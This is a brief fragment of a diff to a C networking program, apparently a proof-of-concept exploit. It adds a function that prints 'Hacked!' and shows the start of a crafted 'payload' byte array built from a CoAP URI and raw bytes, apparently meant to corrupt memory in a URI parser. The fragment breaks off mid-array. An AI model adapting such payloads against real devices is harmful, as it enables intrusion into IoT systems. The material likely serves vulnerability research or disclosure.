@@ -25,6 +25,10 @@
 #include "net/sock/udp.h"
 #include "net/sock/util.h"
 
+void evil_print(void) {
+    puts("Hacked!");
+}
+
 const unsigned char payload[] = {
     'c', 'o', 'a', 'p', ':', '/', '/', '[',':',':','1',']',':',
     'P', 'A', 'Y', 'L', 'O', 'A', 'D', '!', 0x06, 0x48, 0x88, 0x93,
